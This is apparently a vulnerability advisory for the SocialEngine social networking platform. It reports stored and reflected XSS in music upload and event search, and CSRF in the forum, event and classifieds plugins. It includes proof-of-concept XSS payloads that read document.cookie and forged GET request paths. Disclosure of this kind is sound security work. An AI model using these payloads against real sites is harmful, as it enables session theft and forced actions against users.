INFORMATION  Product: Social Engine Remote-Exploit: yes Vendor-URL: http://www.socialengine.net/ Discovered by: Tiago Natel de Moura aka "i4k" Discovered at: CVE Notified: CVE Number:  OVERVIEW  Social Engine versions is vulnerable to XSS and CSRF.  INTRODUCTION  SocialEngine is a PHP-based white-label social networking service platform, that provides features similar to a social network on a user's website. Main features include administration of small-to-mid scale social networks, some customization abilities, unencrypted code, multilingual capability, and modular plugin/widget compatibility. There is a range of templates and add-ons available to extend the basic features already included in the SocialEngine core.  VULNERABILITY DESCRIPTION  == Persistent XSS in music upload. ==  CWE-79: http://cwe.mitre.org/data/definitions/79.html The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.  Proof Of Concept: POST http://localhost/index.php/music/create  POST data without form-data enctype: title=<script>alert(document.cookie);</script>&description=teste &fancyuploadfileids=15  == Persistent XSS in creating events ==  POST  POST data without form-data enctype: title=teste XSS 3&description=teste XSS &endtime[hour]=1&endtime[minute]=0&endtime[ampm]=AM&host=teste auth_view=everyone&auth_comment=everyone&auth_photo=everyone&submit=  == Reflected XSS in search form of events area. ==  Direct javascript injected: POST  format=html&subject=event_1&search=';alert(document.cookie);var a = '  Proof of Concept: - - Go to URL: /index.php/event/$EVENT_ID - - Click on the "Guests" - - Click in "Search guests" form - - Submit: ';alert(document.cookie); var a = '  You will see your PHPSESSID in the alert.  == Multiples CSRF vulnerabilities ==  The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.  A CSRF in the plugin "Forum" allows forcing the owner of the event to do some activities such as:  Close a topic: GET /index.php/forums/topic/4/example-topic/close/close/1  Open a topic: GET /index.php/forums/topic/4/example-topic/close/close/0  A CSRF in the plugin "Event" allows forcing the owner of the event to do some activities such as:  Close the event: GET  Open the event: GET  "Watch Topic": GET  "Stop Watching Topic": GET  A CSRF in the plugin "Classifieds" allows forcing the owner of the event to do some activities such as:  Open the classified listing: GET /index.php/classifieds/close/1/closed/0  Close the classified listing: GET /index.php/classifieds/close/1/closed/1  VERSIONS AFFECTED  Tested with version but earlier versions are possibly vulnerable.  SOLUTION  Upgrade to Social Engine  NOTES   The Common Vulnerabilities and Exposures (CVE) project has assigned the name to this issue. This is a candidate for inclusion in the CVE list (http://cve.mitre.org), which standardizes names for security problems.
